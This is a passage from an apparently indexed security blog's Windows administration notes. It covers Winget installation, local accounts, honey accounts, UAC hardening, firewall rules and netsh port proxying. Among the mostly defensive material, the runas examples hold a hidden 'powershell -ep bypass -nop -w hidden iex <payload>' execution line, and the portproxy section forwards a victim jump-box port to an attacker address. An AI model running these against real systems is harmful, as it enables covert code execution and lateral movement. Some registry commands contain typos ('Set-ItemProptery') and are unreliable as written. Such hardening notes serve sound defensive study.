machines</li> <li>Some applications that participate in Protected Event Logging will encrypt log data with your public key</li> <li>Ship logs to a central SIEM, where they can be decrypted</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#winget","title":"Winget","text":"<p>The Windows Package Manager</p> <ul> <li>https://github.com/microsoft/winget-cli/releases</li> <li>https://learn.microsoft.com/en-us/windows/package-manager/winget/</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#install_1","title":"Install","text":"<p>Winget appears to be available by default on Windows 11 now. But it's not available by default in Windows Sandbox instances or Windows Server.</p> <p>Install the latest version of Winget in Windows Sandbox (or anywhere programmatically):</p> <p>If the Install Fails</p> <p>Be sure to check the link above for the latest URI paths if any component was updated since writing this, otherwise the install may fail.</p> <pre><code>$progressPreference = 'silentlyContinue'\nWrite-Information \"Downloading WinGet and its dependencies...\"\nInvoke-WebRequest -Uri https://aka.ms/getwinget -OutFile Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle\nInvoke-WebRequest -Uri https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx -OutFile Microsoft.VCLibs.x64.14.00.Desktop.appx\nInvoke-WebRequest -Uri https://github.com/microsoft/microsoft-ui-xaml/releases/download/v2.7.3/Microsoft.UI.Xaml.2.7.x64.appx -OutFile Microsoft.UI.Xaml.2.7.x64.appx\nAdd-AppxPackage Microsoft.VCLibs.x64.14.00.Desktop.appx\nAdd-AppxPackage Microsoft.UI.Xaml.2.7.x64.appx\nAdd-AppxPackage Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle\n</code></pre> <p>If you would like a preview or different version of the Package Manager, go to https://github.com/microsoft/winget-cli/releases. Copy the URL of the version you would prefer and update the above Uri.</p> <p>Installing on Windows Server</p> <p>If installing winget on an evaluation copy of Windows Server, you will need to download the msixbundle file and license xml file from GitHub's release page. Otherwise you'll get a license error.</p> <p>See issue #700.</p> <pre><code># Download the msixbundle and xml license file from the latest releases.\n# https://github.com/microsoft/winget-cli/releases\n# Use Add-AppxProvisionedPackage to use the -LicensePath argument.\nAdd-AppxProvisionedPackage -Online -PackagePath .\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle -LicensePath .\\08d8788d59cf47ed9bf42c31e31f8efa_License1.xml -Verbose\n</code></pre> <p>To pull the latest release and install it automatically:</p> <pre><code>$progressPreference = 'silentlyContinue'\n$url = \"https://api.github.com/repos/microsoft/winget-cli/releases/latest\"\n$response = Invoke-RestMethod -Uri \"$url\"\n# You need to use ConvertTo-Json to \"see\" the full structure and obtain the path\n#$response_json = $response | ConvertTo-Json\nforeach ($link in $response.assets.browser_download_url) {\n    $basename = $link | Split-Path -leaf\n    Write-Host \"Downloading $basename...\"\n    iwr -Uri $link -Out $basename\n    # Get the necessary files as variables\n    if ($basename -imatch \"msixbundle\") {\n        $msixbundle_file = $basename\n    }\n    elseif ($basename -imatch \"License1.xml\") {\n        $license_file = $basename\n    }\n}\n# Now with all files downloaded, install the msixbundle\nAdd-AppxProvisionedPackage -Online -PackagePath $msixbundle_file -LicensePath $license_file -Verbose\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#installing-git","title":"Installing Git","text":"<ul> <li>git-scm.com/download/win</li> </ul> <pre><code>winget show --id Git.Git\nwinget install --id Git.Git -e --source winget\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#installing-open-ssh-beta","title":"Installing Open SSH Beta","text":"<ul> <li>github.com/PowerShell/Win32-OpenSSH</li> </ul> <p>The beta version of OpenSSH is part of the PowerShell project and often contains additional (essential) features missing from the stable version.</p> <pre><code>winget search \"openssh beta\"\nwinget install \"openssh beta\"\nwinget uninstall \"openssh beta\"\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#installing-windows-terminal","title":"Installing Windows Terminal","text":"<ul> <li>github.com/microsoft/terminal</li> </ul> <pre><code>winget install --id Microsoft.WindowsTerminal -e\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#install-usbipd","title":"Install USBIPD","text":"<ul> <li>github.com/dorssel/usbipd-win</li> </ul> <p>This project is being developed to allow TCP/IP passthrough of USB devices to WSL2 and Hyper-V VM's on Windows.</p> <pre><code>winget install --interactive --exact dorssel.usbipd-win\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#user-accounts","title":"User Accounts","text":""},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#active-directory_1","title":"Active Directory","text":"<p>To do</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#local-system","title":"Local System","text":"<p>https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/new-localuser?view=powershell-5.1</p> <ol> <li>Create a local user <pre><code>$Password = Read-Host -AsSecureString\nNew-LocalUser \"User2\" -Password $Password -FullName \"Second User\" -Description \"Description of this account.\"\nName    Enabled  Description\n----    -------  -----------\nUser2  True     Description of this account.\n</code></pre></li> </ol> <p>https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/add-localgroupmember?view=powershell-5.1</p> <ol> <li>Add the local user to a group; add them to \"Users\" so they may login</li> </ol> <p>Add a local user to the Users group <pre><code>Add-LocalGroupMember -Group \"Users\" -Member User2\n</code></pre></p> <p>Add a local user to the Administrators group (only do this if UAC is configured correctly and the account will only be used for administration) <pre><code>Add-LocalGroupMember -Group \"Administrators\" -Member User2\n</code></pre></p> <p>You can run commands as another user, you'll be prompted for a password similar to <code>sudo</code>: <pre><code>runas /user:User2 cmd.exe\nrunas /user:Hostname\\DomainUser2 powershell.exe -ep bypass -nop -w hidden iex &lt;payload&gt;\nrunas /user:Domain\\DomainUser2 powershell.exe -ep bypass -nop -w hidden iex &lt;payload&gt;\n</code></pre></p> <p>See HackTricks - Credential User Impersonation for more on this.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#account-policy","title":"Account Policy","text":"<p>To do</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#honey-accounts","title":"Honey Accounts","text":"<p>References:</p> <ul> <li>ippsec - Creating Webhooks in Slack for PowerShell</li> <li>ippsec - Send Notifications to Slack via Scheduled Task Event Filter</li> <li>Active Defense &amp; Cyber Deception - Honey User</li> </ul> <p>How this works:</p> <ul> <li>Create a new user account that will never be used for production</li> <li>Create an alert to trigger on any attempt to login to this account</li> <li>Periodically login to this account and update it's password so it's not obvious it's a honey account when adversaries enumerate your AD environment</li> </ul> <p>This will detect password spraying. A smaller organization would benefit from having this configured to use Slack or Discord for notifications, where a SIEM would be the better option on a larger scale.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#uac-prompt","title":"UAC Prompt","text":"<p>What the UAC prompt is and how / why it works:</p> <p>https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-account-control-behavior-of-the-elevation-prompt-for-standard-users#best-practices</p> <p>Countermeasure Configure the User Account Control: Behavior of the elevation prompt for standard users to Automatically deny elevation requests. This setting requires the user to log on with an administrative account to run programs that require elevation of privilege. As a security best practice, standard users should not have knowledge of administrative passwords. However, if your users have both standard and administrator-level accounts, we recommend setting Prompt for credentials so that the users do not choose to always log on with their administrator accounts, and they shift their behavior to use the standard user account.</p> <p>What the Secure Desktop is and how / why it works:</p> <p>https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation#best-practices</p> <p>Enable the User Account Control: Switch to the secure desktop when prompting for elevation setting. The secure desktop helps protect against input and output spoofing by presenting the credentials dialog box in a protected section of memory that is accessible only by trusted system processes.</p> <p>The secure desktop will obscure the entire desktop behind the prompt, where instead the 'insecure' prompt will leave all of the desktop windows visible.</p> <p>You can see the difference by changing this value (0x1=enabled, 0x0=disabled) here:</p> <pre><code># Enabled\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" -Name \"PromptOnSecureDesktop\" -Type DWord -Value \"0x1\"\n# Disabled\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" -Name \"PromptOnSecureDesktop\" -Type DWord -Value \"0x0\"\n</code></pre> <p>You can easily test if UAC is enabled for administrative actions by running the following:</p> <pre><code># https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/authentication-credentials-uac-and-efs.md#uac-disabled\nStart-Process powershell -Verb runAs \"notepad.exe\"\n</code></pre> <p>If you are not prompted to allow <code>notepad</code> to run, then UAC is not enabled.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#uac-prompt-for-local-users","title":"UAC Prompt for local users","text":"<p>See the following documentation for guidance:</p> <ul> <li>Microsoft Docs, Open Specifications on all UAC settings</li> <li>Microsoft Docs, UAC Best Practices</li> <li>DevBlogs, UAC Settings</li> <li>HackTricks, UAC Bypass</li> <li>FuzzySecurity, UAC Attacks</li> </ul> <p>Summary</p> <p>If these are not set, you are potentially vulnerable to UAC bypass:</p> <pre><code># Check if UAC is active in Admin Approval Mode (value of 1) or inactive (value of 0), you will always want this active\n# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/958053ae-5397-4f96-977f-b7700ee461ec\nGet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" -Name \"EnableLUA\"\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" -Name \"EnableLUA\" -Type DWord -Value \"0x1\"\n\n# Ensure all UAC prompts happen via the secure desktop prompt\n# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/9ad50fd3-4d8d-4870-9f5b-978ce292b9d8\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" -Name \"PromptOnSecureDesktop -Type DWord -Value \"0x1\"\n\n# Require credentials when running as Admin\n# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4\nSet-ItemProptery -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"ConsentPromptBehaviorAdmin\" -Type DWord -Value \"0x1\"\n\n# Deny all elevation for standard users\n# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/15f4f7b3-d966-4ff4-8393-cb22ea1c3a63\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"ConsentPromptBehaviorUser\" -Type DWord -Value \"0x0\"\n# Require credentials for standard users\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"ConsentPromptBehaviorUser\" -Type DWord -Value \"0x1\"\n</code></pre> <p>The recommended setting is to automatically deny elevation of privileges to standard users.</p> <p>If a user regularly requires administrative access, it's recommended to instead prompt for admin credentials. This way administrative tasks are performed only when needed, and the account is otherwise running in the context of a standard user.</p> <ul> <li><code>0x0</code> = Automatically deny (all UAC actions require logging in as admin, best)</li> <li><code>0x1</code> = Prompt for credentials on the secure desktop (recommended if not 0x0)</li> <li><code>0x2</code> = Prompt for credentials (Default)</li> </ul> <p>This setting prevents standard users from performing administrative actions:</p> <pre><code>Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"ConsentPromptBehaviorUser\" -Type DWord -Value \"0x0\"\n</code></pre> <p>Alternatively, this allows the user to elevate privileges temporarily using the separate administrative account's credentials:</p> <pre><code>Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"ConsentPromptBehaviorUser\" -Type DWord -Value \"0x1\"\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#uac-prompt-for-local-admins","title":"UAC Prompt for local admins","text":"<ul> <li><code>0x0</code> = Elevate without prompting (perform admin actions automatically, dangerous)</li> <li><code>0x1</code> = Prompt for credentials (username / password) on the secure desktop</li> <li><code>0x2</code> = Prompt for interaction (y/n dialogue) on the secure desktop</li> </ul> <p>This will prompt the administrator account for any valid administrator credentials via the secure desktop to take actions:</p> <pre><code>Set-ItemProptery -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"ConsentPromptBehaviorAdmin\" -Type DWord -Value \"0x1\"\n</code></pre> <p>When logged in as an admin, this will prompt the user with a yes/no dialogue instead of credentials before performing actions:</p> <pre><code>Set-ItemProptery -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"ConsentPromptBehaviorAdmin\" -Type DWord -Value \"0x2\"\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#network","title":"Network","text":"<p>Display general network information <pre><code>ipconfig\nipconfig /all\n</code></pre></p> <p>Flush the DNS cache <pre><code>ipconfig /flushdns\n</code></pre></p> <p>Show all active protocols and connections <pre><code>netstat -ano\n</code></pre></p> <p>Show the executable involved in creating all active protocols and connections <pre><code>netstat -abno    # Requires Administrative privileges\n</code></pre></p> <p>Display the arp table <pre><code>arp -a\n</code></pre></p> <p>Display the routing table <pre><code>route print\n</code></pre></p> <p>Additional tools for network visibility:</p> <ul> <li>https://www.wireshark.org/</li> <li>https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#troubleshooting_1","title":"Troubleshooting","text":"<p>Sometimes when trying to start a service on a specific port (<code>py -m http.server 8080 --bind &lt;your-ip&gt;</code>) you'll receive an error about lacking permissions even if you're running as administrator.</p> <p>https://stackoverflow.com/questions/10461257/an-attempt-was-made-to-access-a-socket-in-a-way-forbidden-by-its-access-permissi</p> <p>This is often caused by a socket already being used by another service. Use <code>netstat</code> to review and remediate this:</p> <pre><code>NETSTAT.EXE -abno | Select-String \"8080\" -Context 2,2\n\n    TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       7176\n   Can not obtain ownership information\n&gt;   TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       2564\n   [spoolsv.exe]\n    TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       2564\n    TCP    [::]:7680              [::]:0                 LISTENING       7176\n   Can not obtain ownership information\n&gt;   TCP    [::]:8080              [::]:0                 LISTENING       2564\n   [spoolsv.exe]\n    TCP    [::]:8443              [::]:0                 LISTENING       2564\n\n\nPS C:\\&gt; Stop-Process -Name spoolsv\n</code></pre> <p>In the above case, a meterpreter session had migrated to the <code>spoolsv.exe</code> process and was port forwarding traffic on tcp/8080.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#dns","title":"DNS","text":"<p>DNS on Windows 11 Clients</p> <p>You can configure DNS over HTTPS for all interfaces with the following.</p> <ul> <li>\"Settings\" &gt; \"Network &amp; internet\"</li> <li>Choose \"Wi-Fi\" or \"Ethernet\", depending on your current connection</li> <li>Choose \"Hardware properties\" (you can also select the active network connection and under DNS settings choose <code>Change DNS settings for all networks</code>)</li> <li>Choose \"Edit\" under the block with \"DNS server assignment\"</li> <li>IPv4 &gt; On</li> <li>Preferred DNS (can be Quad9 or Cloudflare, Windows has these templates built in now)</li> <li>DNS over HTTPS &gt; On (automatic template)</li> <li>This will autofill the URL for DoH connections</li> <li>Ensure \"Fallback to plaintext\" &gt; Off</li> </ul> <p>When finished, you'll see <code>(Encrypted)</code> next to each DNS server entry.</p> <p>You can fill out 2 IPv4 and 2 IPv6 DNS settings, and Windows will enforce this DNS configuration for every Wi-Fi or Ethernet network you connect to.</p> <p>For an Active Directory client, you'll need at least one of the primary DNS servers to point to a domain-joined DNS server, with the fallback DNS being one of Cloudflare's or Quad9's public servers.</p> <p>DNS on Windows Server</p> <p>The Quad9 documentation demonstrates the steps required to configure Windows DNS Server for DNS forwarding. You could replicate those steps for Google (<code>8.8.8.8</code>) and Cloudflare (<code>1.1.1.1</code>).</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#firewall-rules","title":"Firewall Rules","text":"<p>Open Windows Defender Firewall from an elevated PowerShell prompt with:</p> <pre><code>wf.msc\n</code></pre> <p>The way Windows Defender Firewall works is when it's enabled, the default policies take precedence, followed by any specific rules as exceptions.</p> <p>When it's disabled, no rules work.</p> <p>This means if you want to deploy a highly customized rule set, backup, then wipe the entire default rule set, set your default policies, then add your own rules.</p> <p>In other words:</p> <ul> <li>If the default inbound policy is set to block, you will need to create inbound rules.</li> <li>If the default inbound policy is set to allow, you will need to create block rules.</li> </ul> <p>If you're an admin on a machine using a low privileged account for regular use, and need to review the firewall GUI without logging out, you can open an administrative PowerShell prompt and run <code>C:\\Windows\\System32\\WF.msc</code></p> <p>Example baseline policy executed in <code>cmd.exe</code>:</p> <pre><code>netsh advfirewall set allprofiles state on\nnetsh advfirewall set allprofiles firewallpolicy blockinboundalways,allowoutbound\nnetsh advfirewall set allprofiles logging droppedconnections enable\nnetsh advfirewall set allprofiles settings inboundusernotification enable\nnetsh advfirewall set allprofiles settings remotemanagement disable\nnetsh advfirewall set allprofiles logging maxfilesize 8000\nnetsh advfirewall set allprofiles logging filename %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\n\nnetsh advfirewall show currentprofile\n</code></pre> <p>Example baseline policy executed in <code>PowerShell</code>:</p> <pre><code># https://docs.microsoft.com/en-us/powershell/module/netsecurity/set-netfirewallprofile?view=windowsserver2022-ps\nSet-NetFirewallProfile -All -Enabled True\nSet-NetFirewallProfile -All -DefaultInboundAction Block\nSet-NetFirewallProfile -All -AllowInboundRules True\nSet-NetFirewallProfile -All -AllowUnicastResponseToMulticast False\nSet-NetFirewallProfile -All -NotifyOnListen True # Windows displays a notification when blocking an application\nSet-NetFirewallProfile -All -LogFileName \"%systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\"\nSet-NetFirewallProfile -All -LogMaxSizeKilobytes 8000\nSet-NetFirewallProfile -All -LogAllowed False\nSet-NetFirewallProfile -All -LogBlocked True\nSet-NetConnectionProfile -NetworkCategory Public\n</code></pre> <p>NOTE: these baselines are fairly close to the defaults, and are mainly for reference.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#managing-firewall-rules-powershell","title":"Managing Firewall Rules (PowerShell)","text":"<p>There are three different network profiles in Windows:</p> Profile Description Public Considered untrusted, similar to being publicly accessible on the internet Domain Considered trusted, typically a managed corporate network Private Considered trusted, a 'home' network <p>Get information about all, or a specific, network profile: <pre><code>Get-NetFirewallProfile\nGet-NetFirewallProfile -Name Domain\nGet-NetFirewallProfile -Name Private\nGet-NetFirewallProfile -Name Public\n</code></pre></p> <p>Get information about all network interfaces: <pre><code>Get-NetConnectionProfile\n</code></pre></p> <p>Sometimes you need to change the profile of a specific network interface, here's how with PowerShell: <pre><code>Set-NetConnectionProfile -InterfaceAlias EthernetX -NetworkCategory Public\n</code></pre></p> <p>This is important to manually configure on multi-homed and domain joined systems. It's possible Windows will automatically and incorrectly assign Public / Private networking profiles to the wrong interfaces, exposing services to untrusted networks.</p> <p>NOTE: You can also review the active network profile per interface under Settings &gt; Network &amp; Internet &gt; EthernetX Properties.</p> <p>Get general information about the firewall rules: <pre><code>Get-NetFirewallProfile -All\nGet-NetFirewallRule -All\nGet-NetFirewallRule -Direction Inbound -Enabled True -Action Allow\nGet-NetFirewallPortFilter -All | Where-Object -Property LocalPort -eq 22\n</code></pre></p> <p>Turn off the firewall for all profiles: <pre><code>Set-NetFirewallProfile -Enabled False\n</code></pre></p> <p>Enable the firewall on the Public profile: <pre><code>Set-NetFirewallProfile -Enabled True -Name Public\n</code></pre></p> <p>Add inbound rules for RDP and SSH: <pre><code>New-NetFirewallRule -DisplayName \"Remote Desktop\" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -Enabled True\nNew-NetFirewallRule -DisplayName \"SSH\" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -Enabled True\n</code></pre></p> <p>Delete inbound rules for RDP and SSH: <pre><code>Get-NetFirewallRule -DisplayName \"Remote Desktop\" | Remove-NetFirewallRule\nGet-NetFirewallPortFilter -All | where { $_.LocalPort -eq 22 } | Get-NetFirewallRule | where -Property displayname -Contains \"SSH\" | Remove-NetFirewallRule\n</code></pre></p> <p>Working with firewall rules in PowerShell on Windows is a bit strange because <code>-NetFirewallRule</code> results do not contain the same information as <code>-NetFirewallPortFilter</code> to parse. This means you'll need to use both (like the example above) and confirm the <code>DisplayName</code> or the more unique <code>Name</code> of the rule before deleting it, as multiple rules can exist for the same port. If you're not specific, and simply pipe all results out to <code>Remove-NetFirewallRule</code> you can end up unintentionally deleting additional rules.</p> <p>You can be more specific to delete anything matching precise criteria like this: <pre><code>Get-NetFirewallPortFilter -All | where { $_.LocalPort -eq 5353 } | Get-NetFirewallRule | where { $_.Direction -eq \"Inbound\" -and $_.Action -eq \"Allow\" -and $_.Enabled -eq \"True\" -and $_.Profile -eq \"Public\" -and $_.DisplayName -match \"mDNS\"}\n</code></pre></p> <p>On a default Windows 10 install, this should match only a single rule. Append <code>| Remove-NetFirewallRule</code> to the above command to delete it.</p> <p>Look for rules with specific ports: <pre><code>Get-NetFirewallPortFilter -All | where { $_.LocalPort -eq 20 -or $_.LocalPort -eq 445 }\n</code></pre></p> <p>Look for rules with specific ports, and print their related complete rule entry to parse further: <pre><code>Get-NetFirewallPortFilter -All | where { $_.LocalPort -eq 20 -or $_.LocalPort -eq 445 } | Get-NetFirewallRule\n</code></pre></p> <p>Look for rules within a range of ports: <pre><code>Get-NetFirewallPortFilter -All | where { $_.LocalPort -ge 20 -and $_.LocalPort -le 445 }\n</code></pre></p> <p>Load all active / allowed inbound port rules into the variable '$inboundrules': <pre><code>$inboundrules = Get-NetFirewallRule * | where { ($_.Direction -like \"Inbound\" -and $_.Action -like \"Allow\" -and $_.Enabled -like \"True\") }\n</code></pre></p> <p>List firewall rule name + display name for all active / allowed inbound ports: <pre><code>$inboundrules | Select-Object -Property Name,DisplayName\n</code></pre></p> <p>List all unique active / allowed  inbound ports: <pre><code>$inboundrules | Get-NetFirewallPortFilter | Select-Object -Property LocalPort -Unique\n</code></pre></p> <p>List DisplayName + rule information</p> <p>https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-string?view=powershell-7.2</p> <p>https://docs.microsoft.com/en-us/dotnet/api/system.string.trim?view=net-6.0#system-string-trim</p> <pre><code>Get-NetFirewallRule -Direction \"Inbound\" -Enabled \"true\" -Action \"Allow\" | ForEach-Object {\n    ($_ | Select-Object -Property DisplayName | fl | Out-String).trim()\n    ($_ | Select-Object -Property Profile | fl | Out-String).trim()\n     $_ | Get-NetFirewallPortFilter\n}\n</code></pre> <p>List DisplayName + port information for all inbound rules currently enabled and allowed:</p> <pre><code>Get-NetFirewallRule -Direction \"Inbound\" -Enabled \"true\" -Action \"Allow\" | ForEach-Object {\n    echo \"\"\n    ($_ | Select-Object -Property DisplayName | fl | Out-String).trim()\n    ($_ | Select-Object -Property Profile | fl | Out-String).trim()\n    ($_ | Get-NetFirewallPortFilter | Select-Object -Property Protocol,LocalPort | fl | Out-String).trim()\n}\n</code></pre> <p>Example result of the previous command:</p> <pre><code>...\nDisplayName : Microsoft Edge (mDNS-In)\nProfile : Any\nProtocol  : UDP\nLocalPort : 5353\n\nDisplayName : Cortana\nProfile : Domain, Private, Public\nProtocol  : Any\nLocalPort : Any\n...\n</code></pre> <p>Knowing the format of the above results, you can do a context search by appending <code>| Select-String \"&lt;port&gt;\" -Context 3,0</code>, which will print only the results matching <code>&lt;port&gt;</code>. For example to get all enabled and allowed inbound rules matching port 5353: <pre><code>Get-NetFirewallRule -Direction \"Inbound\" -Enabled \"true\" -Action \"Allow\" | ForEach-Object {\n    echo \"\"\n    ($_ | Select-Object -Property DisplayName | fl | Out-String).trim()\n    ($_ | Select-Object -Property Profile | fl | Out-String).trim()\n    ($_ | Get-NetFirewallPortFilter | Select-Object -Property Protocol,LocalPort | fl | Out-String).trim()\n} | Select-String \"5353\" -Context 3,0\n</code></pre></p> <p>You can take any commands that have extensive output and use a context search to obtain the rule name based on the port with something like <code>Select-String \"&lt;port&gt;\" -Context &lt;lines-before&gt;,&lt;lines-after&gt;</code>.</p> <p>Get all active rules permitting inbound traffic, that are lacking a description (good indicator of third party or possibly malicious rules): <pre><code>Get-NetFirewallRule | where { $_.Enabled -eq \"True\" -and $_.Direction -eq \"Inbound\" -and $_.Action -eq \"Allow\" -and $_.Description -eq $nul }\n</code></pre></p> <p>Get all active inbound firewall rules and disable them: <pre><code>Get-NetFirewallRule | Where-Object -Property Direction -eq Inbound | Where-Object -Property Enabled -eq True | Set-NetFirewallRule -Enabled -eq False\n</code></pre></p> <p>Disable all rule names matching regex \"Cast to Device*\": <pre><code>Set-NetFirewallRule -DisplayName \"Cast to Device*\" -Enabled False\n</code></pre></p> <p>Set rule names matching regex \"mDNS\" or \"LLMNR\" to block: <pre><code>Set-NetFirewallRule -DisplayName \"mDNS*\" | Set-NetFirewallRule -Action \"Block\"\nSet-NetFirewallRule -DisplayName \"*LLMNR*\" | Set-NetFirewallRule -Action \"Block\"\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#managing-firewall-rules-cmdexe","title":"Managing Firewall Rules (cmd.exe)","text":"<p>cmd.exe / netsh.exe basics: <pre><code>netsh advfirewall show all\nnetsh advfirewall show allprofiles\nnetsh advfirewall show currentprofile\nnetsh advfirewall set domainprofile state on\nnetsh advfirewall set privateprofile state off\nnetsh advfirewall set allprofiles state off\nnetsh advfirewall firewall show rule all\nnetsh advfirewall firewall show rule all dir=in\nnetsh advfirewall firewall show rule name=\"&lt;rule-name&gt;\"\n</code></pre></p> <p>Limit output by listing only all enabled, inbound rules, rule name, profile, and local port: <pre><code>netsh advfirewall firewall show rule name=all dir=in | findstr /BR /C:\"Rule Name\" /C:\"-\" /C:\"Enabled\" /C:\"Profiles\" /C:\"LocalPort\" /C:\"Action:.*Allow\" /C:\"^$\"\n\n# Example output:\n\nRule Name:                            Remote Event Log Management (NP-In)\n----------------------------------------------------------------------\nEnabled:                              No\nProfiles:                             Domain\nLocalPort:                            445\nAction:                               Allow\n</code></pre></p> <p>This will do the equivalent of <code>-B</code> / <code>-A</code> in <code>grep</code> to search for rules based on LocalPort, but PowerShell is required: <pre><code>netsh advfirewall firewall show rule name=all dir=in | Select-String \"LocalPort:.*443\" -Context 10,10\nnetsh advfirewall firewall show rule name=all dir=in | Select-String \"Rule Name:.*SSH\" -Context 10,10\n</code></pre></p> <p>Add inbound rules for RDP and SSH: <pre><code>netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in protocol=TCP localport=3389 action=allow\nnetsh advfirewall firewall add rule name=\"SSH\" dir=in protocol=TCP localport=22 action=allow\n</code></pre></p> <p>Add outbound egress rules: <pre><code>netsh advfirewall firewall add rule name=\"Egress 10.0.0.0/8\" dir=out protocol=any action=block remoteip=10.0.0.0/8\nnetsh advfirewall firewall add rule name=\"Default Gateway\" dir=out protocol=any remoteip=&lt;gateway-ip&gt; interfacetype=lan action=allow\nnetsh advfirewall firewall add rule name=\"Egress fc00::/7\" dir=out protocol=any action=block remoteip=fc00::/7\n</code></pre></p> <p>Delete a rule called \"Remote Desktop\" <pre><code>netsh advfirewall firewall delete rule name=\"Remote Desktop\"\n</code></pre></p> <p>Delete all rules for local port tcp/80: <pre><code>netsh advfirewall firewall delete rule name=all protocol=tcp localport=80\n</code></pre></p> <p>Reset Firewall (To Defaults) <pre><code>netsh advfirewall reset\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#netsh-port-proxy","title":"Netsh Port Proxy","text":"<p>https://www.sans.org/blog/pen-test-poster-white-board-cmd-exe-c-netsh-interface/</p> <p>Windows <code>Net Shell</code> command</p> <ul> <li>Using 0.0.0.0 as the listen address makes the portproxy bind to all interfaces</li> <li>Using v4tov6 allows bidirectional IPv4 and IPv6 usage</li> </ul> <pre><code>netsh interface portproxy show all\nnetsh interface portproxy show v4tov4\nnetsh interface portproxy show v4tov6\nnetsh interface portproxy show v6tov4\nnetsh interface portproxy show v6tov6\n\nnetsh interface portproxy add v4tov4 listenaddress=&lt;local-addr&gt; listenport=&lt;local-port&gt; connectaddress=&lt;dest-addr&gt; connectport=&lt;dest-port&gt;\nnetsh interface portproxy add v4tov4 listenaddress=&lt;jump-box-addr&gt; listenport=&lt;jump-box-port&gt; connectaddress=&lt;attacker-addr&gt; connectport=&lt;attacker-web-server-port&gt;\nnetsh interface portproxy add v4tov4 listenport=8443 listenaddress=10.0.0.15 connectport=443 connectaddress=172.16.1.28\nnetsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=443 connectaddress=172.16.1.28\n</code></pre> <p>Forwards traffic hitting victim's / jump box's <code>listenaddress:listenport</code> to attacker's <code>connectaddress:connectport</code></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#blockinboundalways-allowinboundrules-false","title":"blockinboundalways / -AllowInboundRules False","text":"<p>To drop all inbound connections even if Windows has a default allow rule for the service:</p> <pre><code>#cmd.exe\nnetsh advfirewall set allprofiles firewallpolicy blockinboundalways,allowoutbound\n\n#powershell\nSet-NetFirewallProfile -AllowInboundRules False\n</code></pre> <ul> <li>On domain joined workstations, this will not disrupt connections to server file shares and stops lateral movement between workstations</li> <li>Workstation typically should not need to talk to each other, with the server being the central point of authentication</li> <li>On personal, non domain joined workstations this should be the default setting, and an absolute must for travel / using untrusted LAN and WiFi networks</li> </ul> <p>Keep in mind on cloud instances of Windows in Azure / AWS / GCP this will likely lock you out of the machine</p> <p>To enable 